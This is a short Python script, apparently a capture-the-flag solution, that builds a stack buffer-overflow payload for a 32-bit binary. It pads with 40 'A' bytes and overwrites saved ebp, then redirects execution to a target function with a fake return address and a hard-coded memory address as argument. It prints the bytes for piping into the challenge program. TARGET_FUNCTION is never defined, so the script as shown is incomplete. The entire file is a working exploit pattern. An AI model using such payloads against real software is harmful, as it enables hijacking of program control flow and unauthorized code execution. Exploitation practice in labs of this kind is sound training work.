#!/usr/bin/python
import sys
import struct

# run < <(python challenge.py)

payload_locations = [
    b'\x50\xa0\x04\x08',
    b'\x54\xa0\x04\x08',
    b'\x58\xa0\x04\x08'
]

deadcode = b'\xde\xc0\xad\xde'

payload = b'A'*40
payload += b'B'*4                # ebp

payload += TARGET_FUNCTION       # function to exec
payload += deadcode              # return for TARGET_FUNCTION
payload += payload_locations[0]  # argument for TARGET_FUNCTION

sys.stdout.buffer.write(payload)
